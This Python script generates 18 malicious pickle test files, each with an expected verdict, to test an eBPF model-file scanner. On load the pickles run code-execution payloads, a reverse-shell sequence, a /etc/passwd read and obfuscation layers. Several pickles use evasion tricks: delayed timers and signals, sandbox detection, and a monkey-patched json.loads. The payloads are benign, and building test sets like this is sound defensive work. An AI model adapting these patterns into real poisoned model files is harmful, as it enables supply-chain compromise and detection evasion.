#!/usr/bin/env python3
"""Generate malicious pickle test files for the MLiciousPickles eBPF scanner.

Produces 18 pickle files across three categories:
  A) Overt    -- obviously malicious, must be detected
  B) Obfuscated -- Python-level indirection hiding the same syscalls
  C) Evasive  -- techniques targeting dynamic-analysis blind spots

Each pickle is non-destructive (echoes strings, reads world-readable files).

Reference: "The Art of Hide and Seek: Making Pickle-Based Model Supply Chain
Poisoning Stealthy Again" (arXiv 2508.19774) -- PICKLECLOAK evasion taxonomy.

Usage:
    python3 test/gen_pickles.py            # writes to test/pickles/
"""

import base64
import json
import os
import pickle
import textwrap
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
OUT_DIR = SCRIPT_DIR / "pickles"
MANIFEST: list[dict] = []


def register(
    filename: str,
    category: str,
    technique: str,
    expected_verdict: str,
    targeted_rules: list[str],
    description: str,
):
    MANIFEST.append(
        {
            "file": filename,
            "category": category,
            "technique": technique,
            "expected_verdict": expected_verdict,
            "targeted_rules": targeted_rules,
            "description": description,
        }
    )


def dump(obj, filename: str) -> None:
    path = OUT_DIR / filename
    path.write_bytes(pickle.dumps(obj, protocol=2))


# Category A: Overt malicious

# A1 -- os.system("echo pwned")
class OvertExecCmd:
    """Direct os.system() call -- triggers execve -> CRITICAL."""

    def __reduce__(self):
        return (os.system, ("echo pwned",))


# A2 -- subprocess via /bin/bash
class OvertShellBash:
    """subprocess.check_output with explicit /bin/bash -- triggers
    shell_execution -> CRITICAL."""

    def __reduce__(self):
        import subprocess

        return (subprocess.check_output, (["/bin/bash", "-c", "echo pwned"],))


# A3 -- read /etc/passwd (sensitive file access)
# We can't pickle builtins.open directly with two chained calls, so use exec
class OvertReadPasswd:
    """Opens /etc/passwd -- triggers sensitive_file_access -> HIGH."""

    def __reduce__(self):
        return (exec, ("open('/etc/passwd').read()",))


# A4 -- external network connection
class OvertConnectExternal:
    """Creates socket and connects to 8.8.8.8:53 -- triggers
    socket_creation + external_connection -> HIGH."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            try:
                s.connect(("8.8.8.8", 53))
            except Exception:
                pass
            finally:
                s.close()
        """)
        return (exec, (code,))


# A5 -- reverse shell pattern (socket + connect + shell exec)
class OvertReverseShell:
    """Socket->connect->dup2->execve /bin/sh pattern -- triggers
    reverse_shell -> CRITICAL.  Connects to 127.0.0.1:1 which will
    fail to connect, but the syscall sequence is still visible."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import socket, os
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                s.connect(("127.0.0.1", 1))
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                os.execv("/bin/sh", ["/bin/sh", "-i"])
            except Exception:
                pass
            finally:
                s.close()
        """)
        return (exec, (code,))


# A6 -- file deletion
class OvertFileDelete:
    """Creates then removes a temp file -- triggers file_deletion -> MEDIUM."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import os, tempfile
            fd, path = tempfile.mkstemp(prefix="mlicious_test_")
            os.close(fd)
            os.remove(path)
        """)
        return (exec, (code,))


# A7 -- process fork via os.fork()
class OvertProcessFork:
    """Calls os.fork() -- triggers process_creation (clone without
    CLONE_THREAD) -> MEDIUM."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import os
            pid = os.fork()
            if pid == 0:
                os._exit(0)
            else:
                os.waitpid(pid, 0)
        """)
        return (exec, (code,))


# Category B: Obfuscated (same syscalls, hidden callables)

# B1 -- base64-encoded exec payload
class ObfuscBase64Exec:
    """exec(base64.b64decode(...)) where decoded string calls os.system.
    Bypasses static scanners that grep for 'os.system', but the eBPF
    scanner still sees the execve syscall."""

    def __reduce__(self):
        payload = base64.b64encode(b"import os; os.system('echo pwned')")
        code = (
            f"exec(__import__('base64').b64decode({payload!r}))"
        )
        return (exec, (code,))


# B2 -- getattr + __import__ chain
class ObfuscGetattrImport:
    """getattr(__import__('os'), 'system')('echo pwned') -- uses dynamic
    attribute resolution to hide the callable from static analysis."""

    def __reduce__(self):
        # pickle's __reduce__ can return (callable, args).
        # We use apply to chain: getattr(__import__("os"), "system")
        # then call the result.  Simplest via exec.
        return (exec, ("getattr(__import__('os'), 'system')('echo pwned')",))


# B3 -- importlib indirect import
class ObfuscImportlib:
    """importlib.import_module('os').system('echo pwned') -- hides the
    import behind importlib indirection."""

    def __reduce__(self):
        return (
            exec,
            ("__import__('importlib').import_module('os').system('echo pwned')",),
        )


# B4 -- eval(compile(...))
class ObfuscEvalCompile:
    """eval(compile(code, '', 'exec')) -- wraps code in compile+eval to
    defeat simple string matching."""

    def __reduce__(self):
        return (
            exec,
            ("eval(compile(\"__import__('os').system('echo pwned')\",'<pkl>','exec'))",),
        )


# B5 -- nested pickle (pickle-in-pickle)
class ObfuscNestedPickle:
    """Outer pickle calls pickle.loads(inner_bytes) where inner_bytes is
    a pickled os.system call.  The dangerous callable only appears in
    the inner layer, evading single-pass static analysis."""

    def __reduce__(self):
        inner = pickle.dumps(OvertExecCmd(), protocol=2)
        return (pickle.loads, (inner,))


# Category C: Evasive (targeting dynamic analysis gaps)

# C1 -- threading.Timer with delay beyond scanner timeout
class EvasiveTimerDelay:
    """Schedules os.system via threading.Timer with a 45-second delay.
    The scanner kills the Python process after 30s, so the timer never
    fires.  The Timer thread is daemonic and dies with the process.

    Ref: PICKLECLOAK -- delayed execution / temporal evasion."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import threading, os
            t = threading.Timer(45, os.system, ("echo pwned",))
            t.daemon = True
            t.start()
        """)
        return (exec, (code,))


# C2 -- atexit handler
class EvasiveAtexit:
    """Registers os.system as an atexit handler.  The payload fires
    during interpreter shutdown, BEFORE the process calls exit_group.
    eBPF should still be monitoring at that point.

    Ref: PICKLECLOAK -- deferred execution via interpreter hooks."""

    def __reduce__(self):
        code = "import atexit, os; atexit.register(os.system, 'echo pwned')"
        return (exec, (code,))


# C3 -- environment keying (sandbox detection)
class EvasiveEnvKeying:
    """Inspects sys.argv for the scanner's specific invocation pattern:
    python3 -c "import pickle, sys; pickle.loads(...)".  If detected,
    suppresses the payload entirely.  In normal usage (e.g. torch.load,
    joblib) the payload fires.

    Ref: PICKLECLOAK -- environment-aware payload keying."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import sys
            # Detect the MLiciousPickles scanner invocation pattern
            in_scanner = (
                len(sys.argv) >= 2
                and sys.argv[0] == "-c"
                or any("pickle.loads" in str(a) for a in sys.argv)
            )
            if not in_scanner:
                __import__("os").system("echo pwned")
        """)
        return (exec, (code,))


# C4 -- write-only persistence (no execve, no network)
class EvasiveWritePersistence:
    """Writes a shell payload to /tmp/mlicious_cron_payload.sh without
    executing it.  The only syscall the scanner sees is write(fd>2).
    Actual execution would happen later (e.g., cron, manual run).

    Ref: PICKLECLOAK -- staged payload / persistence-only drop."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            with open("/tmp/mlicious_cron_payload.sh", "w") as f:
                f.write("#!/bin/sh\\necho pwned\\n")
        """)
        return (exec, (code,))


# C5 -- monkey-patch a stdlib function (zero syscalls)
class EvasiveMonkeypatch:
    """Replaces json.loads with a wrapper that calls os.system on first
    invocation.  No syscalls occur during deserialization -- the payload
    is dormant until some later code calls json.loads().  Completely
    invisible to eBPF monitoring.

    Ref: PICKLECLOAK -- in-memory-only poisoning / code injection."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import json, os, functools
            _original = json.loads
            _triggered = [False]
            @functools.wraps(_original)
            def _hooked(s, *a, **kw):
                if not _triggered[0]:
                    _triggered[0] = True
                    os.system("echo pwned")
                return _original(s, *a, **kw)
            json.loads = _hooked
        """)
        return (exec, (code,))


# C6 -- signal-based delayed execution
class EvasiveSignalDelay:
    """Sets a SIGALRM handler that calls os.system, then arms alarm(35).
    The signal would fire at T+35s, but the scanner kills the process
    at T+30s.  If the scanner used a longer timeout, this would trigger.

    Ref: PICKLECLOAK -- temporal evasion via OS signals."""

    def __reduce__(self):
        code = textwrap.dedent("""\
            import signal, os
            def _handler(signum, frame):
                os.system("echo pwned")
            signal.signal(signal.SIGALRM, _handler)
            signal.alarm(35)
        """)
        return (exec, (code,))


PICKLES = [
    # --- Category A: Overt ---
    (
        "overt_exec_cmd.pkl",
        OvertExecCmd(),
        "overt",
        "os.system direct call",
        "MALICIOUS",
        ["process_execution"],
        "Direct os.system('echo pwned') invocation",
    ),
    (
        "overt_shell_bash.pkl",
        OvertShellBash(),
        "overt",
        "subprocess.check_output with /bin/bash",
        "MALICIOUS",
        ["shell_execution", "process_execution"],
        "Shell execution via subprocess with explicit /bin/bash path",
    ),
    (
        "overt_read_passwd.pkl",
        OvertReadPasswd(),
        "overt",
        "open('/etc/passwd').read()",
        "MALICIOUS",
        ["sensitive_file_access"],
        "Read sensitive file /etc/passwd during deserialization",
    ),
    (
        "overt_connect_external.pkl",
        OvertConnectExternal(),
        "overt",
        "socket.connect to 8.8.8.8:53",
        "MALICIOUS",
        ["socket_creation", "external_connection"],
        "Create socket and connect to external IP (Google DNS)",
    ),
    (
        "overt_reverse_shell.pkl",
        OvertReverseShell(),
        "overt",
        "socket + connect + dup2 + execv /bin/sh",
        "MALICIOUS",
        ["reverse_shell", "socket_creation", "process_execution"],
        "Reverse shell pattern: socket, connect, dup2, execv /bin/sh",
    ),
    (
        "overt_file_delete.pkl",
        OvertFileDelete(),
        "overt",
        "os.remove temp file",
        "SUSPICIOUS",
        ["file_deletion"],
        "Create and delete a temporary file via os.remove",
    ),
    (
        "overt_process_fork.pkl",
        OvertProcessFork(),
        "overt",
        "os.fork()",
        "SUSPICIOUS",
        ["process_creation"],
        "Fork a child process via os.fork()",
    ),
    # --- Category B: Obfuscated ---
    (
        "obfusc_base64_exec.pkl",
        ObfuscBase64Exec(),
        "obfuscated",
        "exec(base64.b64decode(...))",
        "MALICIOUS",
        ["process_execution"],
        "Base64-encoded os.system call decoded at runtime",
    ),
    (
        "obfusc_getattr_import.pkl",
        ObfuscGetattrImport(),
        "obfuscated",
        "getattr(__import__('os'), 'system')(cmd)",
        "MALICIOUS",
        ["process_execution"],
        "Dynamic attribute resolution via getattr + __import__",
    ),
    (
        "obfusc_importlib.pkl",
        ObfuscImportlib(),
        "obfuscated",
        "importlib.import_module('os').system(cmd)",
        "MALICIOUS",
        ["process_execution"],
        "Indirect import via importlib.import_module",
    ),
    (
        "obfusc_eval_compile.pkl",
        ObfuscEvalCompile(),
        "obfuscated",
        "eval(compile(code, '', 'exec'))",
        "MALICIOUS",
        ["process_execution"],
        "Payload hidden inside compile() + eval() chain",
    ),
    (
        "obfusc_nested_pickle.pkl",
        ObfuscNestedPickle(),
        "obfuscated",
        "pickle.loads(inner_payload) -- pickle-in-pickle",
        "MALICIOUS",
        ["process_execution"],
        "Nested pickle: outer loads inner which calls os.system",
    ),
    # --- Category C: Evasive ---
    (
        "evasive_timer_delay.pkl",
        EvasiveTimerDelay(),
        "evasive",
        "threading.Timer(45s, os.system) -- beyond timeout",
        "SAFE",
        [],
        "Schedules payload via threading.Timer(45s); scanner timeout is 30s, "
        "process dies before timer fires (daemon thread)",
    ),
    (
        "evasive_atexit.pkl",
        EvasiveAtexit(),
        "evasive",
        "atexit.register(os.system, cmd)",
        "MALICIOUS",
        ["process_execution"],
        "Registers payload as atexit handler; fires during interpreter "
        "shutdown while eBPF is still monitoring",
    ),
    (
        "evasive_env_keying.pkl",
        EvasiveEnvKeying(),
        "evasive",
        "sys.argv inspection -- sandbox detection",
        "SAFE",
        [],
        "Detects scanner invocation pattern (python3 -c 'pickle.loads...') "
        "and suppresses payload; fires only in normal usage contexts",
    ),
    (
        "evasive_write_persistence.pkl",
        EvasiveWritePersistence(),
        "evasive",
        "write shell script to /tmp (no execve)",
        "SUSPICIOUS",
        ["file_write"],
        "Drops payload script to /tmp without executing; only triggers "
        "file_write (MEDIUM), no execve or network",
    ),
    (
        "evasive_monkeypatch.pkl",
        EvasiveMonkeypatch(),
        "evasive",
        "monkey-patch json.loads -- zero syscalls",
        "SAFE",
        [],
        "Replaces json.loads with a trojanized wrapper in-memory; "
        "zero syscalls during deserialization, completely invisible to eBPF",
    ),
    (
        "evasive_signal_delay.pkl",
        EvasiveSignalDelay(),
        "evasive",
        "signal.alarm(35) + SIGALRM handler",
        "SAFE",
        [],
        "Arms SIGALRM at 35s with os.system handler; scanner kills "
        "process at 30s so signal never fires",
    ),
]


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    for entry in PICKLES:
        filename, obj, category, technique, verdict, rules, desc = entry
        dump(obj, filename)
        register(filename, category, technique, verdict, rules, desc)

    manifest_path = OUT_DIR / "manifest.json"
    manifest_path.write_text(json.dumps(MANIFEST, indent=2) + "\n")

    print(f"Generated {len(PICKLES)} pickle files in {OUT_DIR}/\n")
    print(f"{'#':<4} {'File':<32} {'Category':<13} {'Expected':<12}")
    print("-" * 65)
    for i, entry in enumerate(PICKLES, 1):
        filename, _, category, _, verdict, _, _ = entry
        print(f"{i:<4} {filename:<32} {category:<13} {verdict:<12}")
    print(f"\nManifest: {manifest_path}")


if __name__ == "__main__":
    main()